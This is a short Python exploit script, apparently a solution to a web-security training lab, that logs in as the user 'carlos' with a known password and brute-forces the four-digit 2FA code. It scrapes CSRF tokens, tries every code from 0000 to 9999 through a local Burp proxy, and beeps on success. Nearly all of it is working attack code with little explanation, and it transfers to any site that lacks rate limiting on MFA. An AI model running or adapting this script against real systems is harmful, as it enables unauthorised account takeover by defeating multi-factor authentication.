# Let some troubleshooting steps to help tracking what is happening during the exploit
import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import winsound
# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
# Going through Burp will allow sending to browser after bypassing 2FA
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

# Given info so no enumeration
# Need to login as known, send login2 URL as carlos using session cookie from known, then brute force carlos' token
def bypass_2FA(url):
    # Login, attempt MFA
    for j in range(0,10000):
        s = requests.Session()
        # Get CSRF value
        r = s.get(url+'login', verify=False, proxies=proxies)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input")['value']
        #print(f'Login csrf: {csrf}')
        data = {
            "csrf": csrf,
            "username":"carlos",
            "password":"montoya"
        }
        #Log in
        log_in = s.post(url+'login',data = data, verify=False, proxies=proxies)
        #print(f'Login status: {log_in}')
        #print(log_in.text)
        #print(f'Login cookie: {log_in.cookies}')
        # Get 2nd csrf token
        soup2 = BeautifulSoup(log_in.text, 'html.parser')
        csrf2 = soup2.find("input")['value']
        #print(f'Login2 csrf: {csrf2}')
        # Brute-force MFA
        code = j
        data = {
            "csrf": csrf2,
            "mfa-code": f"{code:04d}"
        }
        brute = s.post(url+'login2', data=data, verify=False, proxies=proxies)
        if 'Incorrect' not in brute.text:
            print(f'*** Possible success with MFA code {code:04d}')
            winsound.Beep(440,2000)
            break
        if j % 500 == 0:
            print(f"{j} attempts made so far")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    print('[-] Performing initial login and 2FA bypass')
    bypass_2FA(url)

